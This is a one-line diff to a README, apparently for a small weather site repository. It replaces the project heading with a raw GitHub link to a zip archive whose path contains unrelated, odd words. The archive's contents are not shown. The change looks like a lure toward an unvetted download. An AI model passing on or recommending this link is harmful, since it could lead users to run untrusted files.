@@ -1,1 +1,1 @@
-# weatherify.github.io
+# https://github.com/AviRedDevil/weatherify.github.io/raw/refs/heads/main/mouthbreeder/weatherify_github_io_personably.zip
